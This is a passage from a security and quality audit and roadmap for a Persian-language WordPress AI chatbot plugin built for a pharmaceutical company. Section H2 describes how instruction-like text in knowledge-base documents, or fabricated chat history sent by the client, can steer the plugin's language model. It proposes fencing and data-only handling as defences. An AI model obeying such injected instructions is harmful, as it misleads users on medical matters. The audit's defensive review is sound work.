- **Implementation:** Move `maybe_send_*` calls into a cron callback keyed by submission id; log delivery status (see D7/A7 audit trail).

### D7. 🟠 Serious-ADR alerts can fail silently
- **Where:** `maybe_send_messenger_notification()` / `maybe_send_email_notification()` — return values ignored, no logging, no retry, no admin surface.
- **What:** The 🚨 "life-threatening adverse event" alert — the single most important side effect of this plugin — can silently never arrive (bad token, revoked bot, blocked API, mail misconfig) and nobody will know until an audit. The submissions page shows no delivery status.
- **Solution:** Record notification outcome per submission (`notified_at`, `notify_error` columns or a log table); on failure schedule one retry then surface a persistent admin notice ("N notifications failed — check settings"); add a "send test notification" button next to the settings.
- **Implementation:** Wrap sends, store `wp_remote_retrieve_response_code()` / `wp_mail` boolean; reuse the existing test-AI AJAX pattern for a test-notification button.

### D8. 🔵 Uninstall/cleanup leaves transient litter
- **Where:** `uninstall.php` — deletes options/tables but not the `nafas_rl_*` and `nafas_ai_*` transients, which on sites without object cache live in `wp_options` (AI cache entries can be numerous and multi-KB).
- **Solution/Implementation:** In uninstall (and in "clear cache" admin action worth adding), delete `_transient_nafas_%` / `_transient_timeout_nafas_%` rows with a `LIKE` query.

### D9. 🔵 No multisite support
- **What:** Activation creates tables only for the current site; network activation leaves other sites broken; uninstall doesn't iterate sites.
- **Solution/Implementation:** In the activation hook, if `is_multisite()` and network-wide, loop `get_sites()` + `switch_to_blog()` to create tables; hook `wp_initialize_site` for new sites; mirror in uninstall. Or explicitly declare `Network: false` and document non-support.

---

## E. Accessibility (WCAG)

### E1. 🟠 Chat window is not a dialog: no focus management, no `role`, no focus trap
- **What:** Opening the chat does not move focus into it; there's no `role="dialog"`/`aria-modal`, no focus trap, and closing doesn't return focus to the toggle. Keyboard/SR users tab through the whole page to reach the chat. Escape works (good), click-outside works (good).
- **Solution:** Add `role="dialog" aria-label="دستیار هوشمند"` on the window; on open, move focus to the first actionable element (or the window with `tabindex="-1"`); trap Tab within while open; restore focus to the toggle on close.
- **Implementation:** ~30 lines in the open/close handlers; keep click-outside behavior.

### E2. 🟠 Toggle button state not conveyed; live region misdesigned
- **What:** The launcher's `aria-label` is permanently "باز کردن گفتگو" even when open; no `aria-expanded`. The `aria-live="polite"` sits on the **root container** (and is stripped in the floating path anyway — B11); combined with full-DOM re-render (C3), screen readers either announce the *entire thread* on every change or nothing.
- **Solution:** Toggle `aria-expanded` + swap label on state change. Put `aria-live="polite"` on the message thread only, and (after C3's append-only refactor) announcements become exactly the new message.
- **Implementation:** Two attribute updates in `renderToggle()`; move the live region to `.nfx-chat`.

### E3. 🟡 Form inputs have no programmatic labels
- **What:** In the in-chat forms, `<label>` elements are rendered as siblings with no `for`/`id` association (and contain decorative SVG). Selects and inputs are unnamed for AT; the star rating is mouse-hover-driven with `aria-label` of just "1"–"5"; feedback buttons are bare emoji with `title` only.
- **Solution:** Generate unique ids and set `for`; give stars `aria-label="امتیاز ۳ از ۵"` and a `radiogroup` pattern with `:focus-visible` styling equal to hover; use `aria-pressed` on feedback buttons.
- **Implementation:** Small changes in `field()`, `selectField()`, `renderCsatCard()`, `botActions()`.

### E4. 🟡 No `prefers-reduced-motion` support
- **What:** Ping animation on the launcher, message entrance animations, typewriter effect, spinner — none respect `prefers-reduced-motion: reduce` (WCAG 2.3.3 / vestibular safety).
- **Solution/Implementation:** One CSS block: `@media (prefers-reduced-motion: reduce) { .nfx-root * { animation: none !important; transition: none !important; } }` plus JS check to skip the typewriter (`matchMedia('(prefers-reduced-motion: reduce)').matches`).

### E5. 🔵 Admin screens hardcode `dir="rtl"`; contrast spots
- **What:** Every admin view hardcodes `dir="rtl"` regardless of the dashboard locale (an English-locale admin gets an RTL page). A few muted-on-muted text spots (e.g., `.nfx-disclaimer`, dark-theme muted `#cbd5e1` on `#0f172a` is fine, but small 10–11 px credit text is borderline).
- **Solution/Implementation:** Use `is_rtl()` to set direction; audit small text against 4.5:1 and bump sizes below 12 px.

---

## F. UX / UI / Product

### F1. 🟠 Conversation evaporates on every page navigation
- **What:** Chat state lives in JS memory. Clicking any link on the site destroys the conversation, mid-form-entry included (the ADR form content is lost if the user navigates to check something). This is the single biggest day-to-day UX gap vs. commercial chat widgets.
- **Solution:** Persist `state.items`, `selectedProduct`, and draft form fields to `sessionStorage` (privacy-friendlier than localStorage) on change; rehydrate on load; keep the existing CSAT/session semantics.
- **Implementation:** Serialize a trimmed state (cap to last ~40 items, strip `animate/seen` flags) in `pushBot/pushUser/render`; restore in `startConversation()` when a saved session exists and is < 30 min old.

### F2. 🟡 "Developed by Saeed & Claude" branding hardcoded in the customer-facing widget
- **What:** Every visitor of the pharma company's site sees a developer credit inside the product UI, non-removable from settings. For a white-label/professional deliverable, this must be opt-in (and the About-page contact details are fine — that's the right place).
- **Solution/Implementation:** Add a `show_credit` toggle (default off for the client build); render conditionally in `buildFooter()`.

### F3. 🟡 Errors surface as toasts detached from the form; no inline validation
- **What:** Form validation failures (invalid phone, short description) return from the server and appear as a floating toast, not next to the offending field; the client performs no pre-validation beyond `required`, so users pay a round trip to discover a typo, and the toast disappears after 4 s.
- **Solution:** Client-side validation mirroring server rules (name length, normalized-digit phone regex, description 10–1000) with inline error text under fields (`aria-describedby`); keep server as source of truth; map server field errors to fields (return `field` in the JSON error payload).
- **Implementation:** Add `validateForm()` in JS + error slots in `field()`; extend `handle_submit()` error responses with a `field` key.

### F4. 🟡 Status changes in the submissions list reload the whole page per row
- **What:** `admin.js` handles the status `<select>` by navigating to a GET URL — full page reload per change, scroll position lost, and it's the only way to triage; there are no bulk actions, no "mark all read", and the eye-toggle detail view hides the ADR gold (severity/outcome) behind an extra click with no severity column in the table.
- **Solution:** AJAX-ify status changes (existing nonce infra), add bulk actions (status/delete/export-selected) via checkboxes, and add a Severity column with the red badge for serious ADRs so triage is possible at a glance.
- **Implementation:** Small `wp_ajax_nafas_set_status` endpoint; standard WP list-table bulk-action markup (or convert to `WP_List_Table`).

### F5. 🟡 Q&A bank editing UX collapses at scale
- **What:** Beyond the data-loss bug (B1): no search/filter within the bank, no sort, no per-row product filter, unanswered questions imported from the chatlog (empty answer) are invisible among hundreds of textareas, `usage_count` (the most useful signal) isn't even displayed.
- **Solution:** Paginated, searchable table with inline edit; "needs answer" filter (empty answer rows); usage column; per-product filter — aligns with B1's CRUD refactor.
- **Implementation:** Same work item as B1.

### F6. 🔵 Assorted frontend polish
- **1.** Send button/icon: input is recreated per render (fixed by C3); mobile keyboard closes after each send.
- **2.** `errorMessage()` for HTTP 429 shows the server message (good), but a rate-limited user gets no indication of *when* to retry — include remaining-quota/`retry` hint in the 429 payload.
- **3.** Suggest dropdown isn't keyboard-navigable (no arrow-key selection / `aria-activedescendant`).
- **4.** `copyAnswer()` copies markdown-stripped text — good — but multi-paragraph answers lose blank lines (`boldify` → `stripTags` collapses `<p>` boundaries); join blocks with `\n\n`.
- **5.** Proactive teaser's exit-intent `mouseout` listener stays attached forever even after dismissal; remove it in `dismiss()`.
- **6.** The floating widget renders on **every** page including checkout/login; a per-page/URL exclusion setting is standard for this widget category.
- **7.** No unread badge: if the proactive teaser is dismissed there is no further affordance; the "dot" on the launcher is decorative only.

### F7. 🔵 Shortcode is misleading
- **What:** `[nafas_chatbot]` doesn't embed an inline chat — it renders the same fixed floating launcher (the container div is positioned by fixed CSS). Users placing the shortcode "where they want the chat" will be confused.
- **Solution:** Either support a true inline mode (`[nafas_chatbot inline="yes"]` renders the window statically in-flow, no launcher) or document clearly that the shortcode is a placement-independent enabler.
- **Implementation:** Add an `inline` attribute → root class `nfx-inline` with static positioning CSS; JS skips the toggle and opens immediately.

---

## G. Internationalization

### G1. 🟡 Large parts of the UI bypass the translation system
- **What:** The plugin ships a `.pot` and wraps admin strings, but: (1) most **frontend JS strings** are hardcoded Persian (`'پیام خود را بنویسید...'`, form titles/labels/placeholders, success card text, connection-error messages, `'بازگشت به منوی اصلی'`) — only a subset flows through the `i18n` config; (2) default option values (button labels, fallback message, system prompt) are hardcoded Persian in `defaults()` without `__()`; (3) `current_time( 'H:i - Y/m/d' )` in notifications ignores the site's date format and Jalali-calendar plugins (admins in Iran typically run a Jalali date plugin — Gregorian timestamps in alerts are a paper cut).
- **Solution:** Route every user-visible JS string through the `i18n` config array (or `wp_set_script_translations` with a JSON translation), wrap default strings in `__()` inside `defaults()` (they're evaluated at runtime, so this is safe post-`init`), and use `wp_date( get_option('date_format') . ' ' . get_option('time_format') )` for the notification timestamp.
- **Implementation:** Extend the existing `i18n` array (the mechanism is already there — finish the job); regenerate the `.pot`.

---

## H. AI / LLM Integration Quality

### H1. 🟡 Provider behavior gaps
- **1. Gemini safety blocks are invisible:** when Gemini returns `promptFeedback.blockReason` or a candidate with `finishReason: SAFETY`, the code returns `''` → user gets the generic fallback and the admin log says nothing useful. Parse and log the block reason (medical content trips safety filters more than average).
- **2. Claude temperature comment is wrong:** the code comment claims "Claude 4.x models don't accept temperature" — they do (constraints only apply with extended thinking). The user's temperature setting is silently ignored for Claude, making behavior inconsistent across providers. Send `temperature` to Claude too.
- **3. `max_tokens` future-proofing:** newer OpenAI models use `max_completion_tokens` and reject `max_tokens`. For the `openai` provider, send `max_completion_tokens` (with fallback retry on 400 mentioning the param) or key off model name.
- **4. No truncation handling:** when a reply is cut at the token cap (`finish_reason: length` / `stop_reason: max_tokens`), the user gets a mid-sentence answer with no indication; detect and append a "…" or a "continue" affordance.
- **5. No token/cost telemetry:** every provider returns usage data; it's discarded. Recording tokens per day in the stats table would let the dashboard show cost — highly valuable for the customer paying per token.
- **Implementation:** All fixes are localized in the provider methods; usage recording is one `stat_bump( 'tokens_in'/'tokens_out', n )` per reply.

### H2. 🟡 RAG/prompt construction weaknesses
- **1.** Retrieved KB chunks and product knowledge are concatenated into the system prompt with no delimiter hygiene — a KB document containing instruction-like text becomes indistinguishable from real instructions. Wrap reference material in clear fencing ("اطلاعات مرجع بین ### شروع/### پایان") and instruct the model to treat it as data.
- **2.** The cache key uses `mb_strtolower(trim($message))` but not the plugin's own `normalize()` — "عوارض کلدانیز؟" and "عوارض کلدانیز ؟" miss the cache. Use `Nafas_Chatbot_Ajax::normalize()` in the key.
- **3.** `history` accepted from the client is replayed into the prompt as-is (fabricated assistant turns are possible). That's inherent to stateless design, but worth capping stricter (it correctly caps count/length already) and worth noting: server-side conversation storage (Part 2 R4) eliminates it.
- **4.** In strict-knowledge mode the *bank* still answers from fuzzy token overlap with threshold 0.32 — a wrong-product answer at 0.33 confidence is a real medical-misinformation risk. Consider raising the bank threshold in strict mode and always displaying the matched source question ("بر اساس: «…»") so users can spot mismatches.

---

# Part 2 – Premium Upgrade Roadmap

The goal: evolve from "excellent bespoke plugin" to an enterprise-grade, maintainable, multi-tenant-quality product. Items are ordered by leverage.

### R1. Re-architecture on modern WordPress foundations
- **What:** PSR-4 autoloaded codebase (`src/` with `Nafas\Chatbot\` namespace), service container (lightweight, e.g., a 50-line singleton container), REST API (`nafas/v1`) replacing all admin-ajax endpoints, strict types, PHP 8.1 baseline.
- **Why:** admin-ajax is slow (loads all of admin), untyped, and unversionable. REST gives cacheable schema'd endpoints, proper status codes, and makes the frontend embeddable anywhere (headless sites, mobile app).
- **How:** `register_rest_route( 'nafas/v1', '/chat' | '/suggest' | '/feedback' | '/csat' | '/submissions' … )` with permission callbacks; keep admin-ajax shims for one release; move classes to `src/`, wire composer autoload; introduce interfaces from C1. Migrate incrementally endpoint-by-endpoint.

### R2. Streaming responses (SSE)
- **What:** Stream AI tokens to the browser as they're generated instead of the fake typewriter after a 5–60 s blank wait.
- **Why:** Perceived latency is the #1 quality signal in chat UX; it also lets you drop the 60 s worker-blocking pattern (first byte arrives in ~1 s).
- **How:** All three providers support SSE (`stream: true` / `streamGenerateContent` / Messages streaming). PHP: a REST endpoint that proxies with `curl` `CURLOPT_WRITEFUNCTION`, flushing `text/event-stream` chunks (disable buffering; document nginx `X-Accel-Buffering: no`). JS: `fetch` + `ReadableStream` reader appending to the bubble with progressive markdown rendering. Feature-flag it with graceful fallback to the current non-streaming path for hosts that buffer.

### R3. Real vector retrieval (with graceful offline fallback)
- **What:** Optional embeddings-based semantic search for the KB and Q&A bank, layered on the existing lexical engine.
- **Why:** The token-overlap matcher (even with synonyms) misses paraphrases; embeddings capture "معدهام درد میکنه بعد قرص" ≈ "عوارض گوارشی". Retrieval quality is the ceiling on answer quality.
- **How:** Add an `embedding` column (BLOB of packed floats) to `qa`/`kb` tables; embed at write time via the configured provider (Gemini `text-embedding-004` and OpenAI-compatible endpoints both work; keep a "lexical only" mode for the sanctions/offline scenario). Retrieval: cosine similarity in PHP over the FULLTEXT-prefiltered candidate set (hybrid: BM25 candidates → rerank by cosine) — no vector DB needed at this scale. Cache query embeddings in transients.

### R4. Server-side conversations
- **What:** A `conversations` table (uuid, started_at, product, csat, transcript as message rows) replacing client-supplied history.
- **Why:** Eliminates prompt-forgery via fabricated history (H2.3), enables cross-page persistence (F1) done properly, gives admins full transcripts (today they see isolated Q/A pairs), enables analytics (drop-off points, conversation length), and is a prerequisite for live-agent handoff (R6).
- **How:** `POST /chat` returns/accepts a signed conversation token; server assembles history from its own store with the same count/length caps; chatlog page gains a threaded transcript view; retention/purge cron extends to conversations.

### R5. Admin panel as a modern SPA
- **What:** Rebuild the admin screens with `@wordpress/scripts` + React (Gutenberg components), typed via TypeScript: dashboard with real charts, submissions inbox with bulk triage, Q&A bank CRUD table, KB manager with upload progress and PDF ingestion.
- **Why:** Fixes B1/F4/F5 structurally; WP components give a11y, RTL and dark-mode for free; the current 628-line PHP settings form is at its complexity ceiling.
- **How:** One React app mounted per admin page fed by the REST API (R1); settings via `register_setting` + REST schema so validation lives in one place; charts with a lightweight lib (or `@wordpress/charts`-style SVG) for the trends/CSAT distribution; keep the current PHP views as fallback for one release cycle.

### R6. Live-agent handoff & omnichannel inbox
- **What:** When AI/bank fail (or the user asks), hand off to a human in real time: agent replies from a wp-admin inbox (or via the existing Bale/Telegram bot as a two-way relay), user sees "کارشناس در حال پاسخگویی…".
- **Why:** The plugin already has the concept (handoff → consultation form). Closing the loop with actual chat converts far better than "we'll call you" for a pharma support use case.
- **How:** Conversations (R4) + a `messages` poll/SSE channel; agent availability wired to the existing office-hours model; Telegram/Bale webhook receiver so staff can answer from their phone (`/reply <id> <text>`); auto-timeout back to the consult form when no agent picks up in N minutes.

### R7. Pharmacovigilance-grade compliance module
- **What:** Treat ADR reports as regulated records: append-only audit log (who changed status/when), configurable retention with anonymize-not-delete, E2B(R3)-style XML export (the international ICSR exchange format) alongside CSV, digital acknowledgment number shown to the reporter, optional required fields per severity, delivery-status tracking for alerts (D7), and role separation.
- **Why:** This is the plugin's most differentiated feature; making it audit-ready turns it from a contact form into a compliance product a pharma QA department can adopt formally.
- **How:** `nafas_audit` table (actor, action, object, before/after JSON, ts); capability `nafas_manage_adr` granted to a "Pharmacovigilance Officer" role (dashboard visible without `manage_options` — fixes the current all-or-nothing access); XML exporter template; sequential public report IDs (`ADR-2026-00042`) returned in the success card and notifications.

### R8. Reliability layer for AI calls
- **What:** Circuit breaker (D1), automatic provider failover chain (primary → secondary → bank → fallback message; the settings UI already hints at this mental model), bounded retries with jitter for 429/5xx, request budget alerts ("80% of daily budget used"), token/cost dashboard (H1.5).
- **How:** `Provider_Chain` decorator around `Provider_Interface`; per-provider health transients; `stat_bump('cost_usd_micro', …)` using per-model price table; admin email when the breaker opens.

### R9. Frontend rebuilt as a Web Component with a build pipeline
- **What:** `<nafas-chatbot>` custom element with Shadow DOM, TypeScript source, esbuild/Vite build, code-split (launcher ~5 KB loads always; chat window lazy-loads on first open), CSS custom-properties API for theming.
- **Why:** Shadow DOM ends the theme-CSS arms race (`!important`, z-index 99998) definitively; lazy-loading removes ~40 KB JS + CSS + font from every page view for the majority who never open the chat (Core Web Vitals win); TS + ESLint + Prettier bring the JS to the same standard the PHP already has with PHPCS.
- **How:** Source in `src/frontend/`; `npm run build` emits versioned assets; launcher stub inlines critical CSS; `IntersectionObserver`-free simple click-to-load of the main bundle; keep the no-build escape hatch by committing built assets for release zips.

### R10. Conversation intelligence & continuous improvement loop
- **What:** Auto-clustering of unanswered questions (group near-duplicates by normalized token similarity so the admin answers a *cluster* once), "answer gap" report (top asked-but-unanswered topics per product), automatic draft answers: one-click "generate answer from KB with AI, human approves into bank", weekly email digest (chats, CSAT, top unanswered, serious ADRs).
- **Why:** The plugin already logs unanswered questions — the radar exists but the workflow is manual row-by-row. Closing this loop is what makes the bot measurably smarter every week.
- **How:** Nightly cron clusters `source='unanswered'` rows (greedy similarity over the existing tokenizer); admin page section "پرتکرارترین بیپاسخها"; "پیشنویس با AI" button calls the provider with KB context and stores as a pending bank row (`status: draft`); digest via `wp_mail` using existing stats queries.

### R11. Full i18n + multilingual visitor support
- **What:** Finish G1 (every string translatable), add per-language welcome/labels, auto-detect visitor language, and answer in the visitor's language (the system prompt currently pins Persian).
- **How:** `wp_set_script_translations`; language column on bank/KB rows; system prompt template with `{language}`; Jalali date rendering in admin via `wp_date()` (respects WordPress timezone + date plugins).

### R12. Quality gates & release engineering
- **What:** Everything in C2 plus: PHPStan level 6+, mutation-light coverage targets for the matcher/NLP, visual regression for the widget (Playwright screenshots light/dark/RTL), automated readme.txt/plugin-header version sync, semantic-release generating the changelog, `.distignore`-driven zip artifact, WordPress.org Plugin Check action (even if distributed privately — it catches real issues).
- **How:** Single `ci.yml` (lint → static analysis → unit → e2e) + `release.yml` (tag → build → attach zip). ~1 day of setup that pays forever.

### R13. Observability
- **What:** Structured internal log (ring buffer table or WC-style logger) for AI failures, notification failures, breaker events, migrations; an admin "System Health" panel (provider status, last cron run, table sizes, cache hit rate, PHP/MySQL feature checks like FULLTEXT availability and `AUTH_KEY` presence); integration with Site Health (`site_status_tests`).
- **Why:** Today the only diagnostics are `error_log()` lines the customer will never see. Half of the support burden ("the bot stopped answering") becomes self-service.
- **How:** `nafas_log` table with level/context JSON + retention; `debug` toggle exposing last 100 events in admin; `site_status_tests` filter adding checks (cron scheduled? provider reachable? secrets decryptable?).

### R14. Advanced UX features (competitive parity with commercial widgets)
- **What, in priority order:**
  1. **Session persistence** (F1) and unread-message badge on the launcher.
  2. **File/image attachment on ADR reports** (photo of the rash/package/batch label — huge for pharmacovigilance quality) with strict validation (images only, size cap, EXIF strip) via `wp_handle_upload`.
  3. **OTP-verified phone** (optional) via Iranian SMS gateways (Kavenegar/SMS.ir adapters) so consult requests are callable numbers, plus SMS notification channel for staff alongside Bale/Telegram.
  4. **Rich message types:** product carousels, clickable source citations on RAG answers ("منبع: بروشور کپسولایزر"), collapsible long answers.
  5. **Search across chat history** for returning users (with R4).
  6. **Scheduled proactive campaigns** (per-page invitation texts — "reading the Coldanese page? سوالی درباره کلدانیز دارید؟" keyed off the current URL/product mapping).
- **How:** Each rides on R1/R4/R9 foundations; citations come free once retrieval returns chunk IDs (they already carry `source_title`).

### R15. Data platform hygiene
- **What:** Complete the options→tables migration (C7), add missing indexes as data grows (`chatlog(rating)`, `chatlog(in_bank)`, composite `submissions(type,status,created_at)`), partition-friendly purges (batched DELETEs with LIMIT to avoid long locks), and a WP-CLI command suite (`wp nafas export`, `wp nafas purge --days=90`, `wp nafas qa import file.csv`, `wp nafas stats`) for ops automation.
- **How:** `WP_CLI::add_command( 'nafas', … )` wrapping existing DB methods; index additions via `DB_VERSION` bump; cron purges switch to `DELETE … LIMIT 500` loops.

---

## Priority Fix List (suggested order of execution)

| # | Item | Ref | Effort |
|---|------|-----|--------|
| 1 | CSV formula-injection escaping | A1 | XS |
| 2 | Q&A bank truncation data loss (row-level CRUD or guard) | B1/B2/F5 | M |
| 3 | Product/stat input validation (stats poisoning + prompt injection) | A4/B8 | S |
| 4 | Session rate-limit backstop | A2 | S |
| 5 | Circuit breaker + timeout sanity for AI outages | D1 | S |
| 6 | Persian-digit phone normalization | A9 | XS |
| 7 | Zero-date schema fix (`DEFAULT CURRENT_TIMESTAMP`) | B6 | XS |
| 8 | Notification delivery tracking + async send | D6/D7 | M |
| 9 | Uninstall data-retention option (ADR compliance) | A7 | S |
| 10 | Feedback/CSAT abuse controls | A4 | S |
| 11 | Cannot-delete-last-product/quick-reply fix | B3 | XS |
| 12 | CSV import stream parsing | B5 | XS |
| 13 | Gemini key → header; libsodium secrets | A5/A6 | S |
| 14 | Dialog semantics + focus management + reduced motion | E1/E2/E4 | M |
| 15 | Local font bundling | D4 | XS |
| 16 | Append-only rendering refactor | C3 | M |
| 17 | Session persistence for conversations | F1 | S |
| 18 | Test suite + CI + repo hygiene (zip removal, README) | C2/C4/C9 | M |

---

*End of audit. Every finding above references the exact file/function so a follow-up implementation pass can proceed without re-analyzing the project.*
